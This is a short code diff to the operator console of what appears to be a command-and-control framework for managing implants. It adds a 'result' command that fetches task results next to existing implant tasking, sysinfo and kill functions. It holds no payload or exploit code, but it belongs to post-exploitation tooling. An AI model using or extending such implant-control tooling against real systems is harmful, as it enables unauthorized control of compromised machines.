@@ -5,12 +5,13 @@ from prompt_toolkit.shortcuts import prompt
 from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
 from prompt_toolkit.styles import Style
 from tabulate import tabulate
+
 from .style import PROMPT_STYLE
 from config import OperatorConfig
 from .completer import InteractCompleter
 from .commands import INTERACT_COMMANDS, COMMANDS, walk_dict
 from .logging import get_styled_logger
-from comms import add_task, get_implant_profile, kill_implant, update_implant_profile
+from comms import add_task, get_implant_profile, get_task_result, kill_implant, update_implant_profile
 from opcodes import Opcodes
 
 logger = get_styled_logger()
@@ -59,6 +60,8 @@ def handle(cmd: str, args: List[str], config: OperatorConfig, implant_id: str) -
         return True
     elif cmd == "sysinfo":
         handle_sysinfo(config, implant_id)
+    elif cmd == "result" or cmd == "results":
+        handle_result(config, args)
     elif cmd == "back":
         return True
     elif cmd == "clear":
@@ -219,3 +222,16 @@ def handle_sysinfo(config: OperatorConfig, implant_id: str) -> None:
     """
     logger.debug(f"Sending sysinfo task to {implant_id}")
     add_task(config, Opcodes.SYSINFO.value, implant_id, [])
+
+def handle_result(config: OperatorConfig, args: List[str]) -> None:
+    """
+    Handle the result command, get the results of a task
+    """
+    from .command import print_task_result
+    if len(args) < 1:
+        logger.error("Please provide a task id")
+        return
+
+    task_id = args[0]
+    logger.debug(f"Getting results for task {task_id}")
+    print_task_result(config, task_id)
